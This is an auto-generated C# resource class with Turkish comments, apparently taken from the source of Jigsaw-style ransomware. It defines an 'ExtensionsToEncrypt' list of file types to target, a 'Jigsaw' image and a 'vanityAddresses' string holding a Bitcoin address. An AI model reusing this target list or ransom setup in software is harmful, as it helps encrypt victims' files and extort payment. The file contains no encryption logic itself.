﻿//------------------------------------------------------------------------------
// <auto-generated>
//     Bu kod araç tarafından oluşturuldu.
//     Çalışma Zamanı Sürümü:4.0.30319.42000
//
//     Bu dosyada yapılacak değişiklikler yanlış davranışa neden olabilir ve
//     kod yeniden oluşturulursa kaybolur.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Main.Properties {
    using System;
    
    
    /// <summary>
    ///   Yerelleştirilmiş dizeleri aramak gibi işlemler için, türü kesin olarak belirtilmiş kaynak sınıfı.
    /// </summary>
    // Bu sınıf ResGen veya Visual Studio gibi bir araç kullanılarak StronglyTypedResourceBuilder
    // sınıfı tarafından otomatik olarak oluşturuldu.
    // Üye eklemek veya kaldırmak için .ResX dosyanızı düzenleyin ve sonra da ResGen
    // komutunu /str seçeneğiyle yeniden çalıştırın veya VS projenizi yeniden oluşturun.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Bu sınıf tarafından kullanılan, önbelleğe alınmış ResourceManager örneğini döndürür.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Main.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Tümü için geçerli iş parçacığının CurrentUICulture özelliğini geçersiz kular
        ///   CurrentUICulture özelliğini tüm kaynak aramaları için geçersiz kılar.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   .jpg .jpeg .raw .tif .gif .png .bmp
        ///.3dm .max
        ///.accdb .db .dbf .mdb .pdb .sql
        ///.dwg .dxf
        ///.c .cpp .cs .h .php .asp .rb .java .jar .class .py .js
        ///.aaf .aep .aepx .plb .prel .prproj .aet .ppj .psd .indd .indl .indt .indb .inx .idml .pmd .xqx .xqx .ai .eps .ps .svg .swf .fla .as3 .as
        ///.txt .doc .dot .docx .docm .dotx .dotm .docb .rtf .wpd .wps .msg .pdf .xls .xlt .xlm .xlsx .xlsm .xltx .xltm .xlsb .xla .xlam .xll .xlw .ppt .pot .pps .pptx .pptm .potx .potm .ppam .ppsx .ppsm .sldx .sldm
        ///.wav .mp3 .aif .iff . [dizenin kalan bölümü kesildi]&quot;; benzeri yerelleştirilmiş bir dize arar.
        /// </summary>
        internal static string ExtensionsToEncrypt {
            get {
                return ResourceManager.GetString("ExtensionsToEncrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   System.Drawing.Bitmap türünde yerelleştirilmiş bir kaynak arar.
        /// </summary>
        internal static System.Drawing.Bitmap Jigsaw {
            get {
                object obj = ResourceManager.GetObject("Jigsaw", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   I&apos;m running in Debug mode benzeri yerelleştirilmiş bir dize arar.
        /// </summary>
        internal static string StartModeDebug {
            get {
                return ResourceManager.GetString("StartModeDebug", resourceCulture);
            }
        }
        
        /// <summary>
        ///   1Hd3tU8MDmuVotMgGJTJ7svzvPey6bfUgm benzeri yerelleştirilmiş bir dize arar.
        /// </summary>
        internal static string vanityAddresses {
            get {
                return ResourceManager.GetString("vanityAddresses", resourceCulture);
            }
        }
    }
}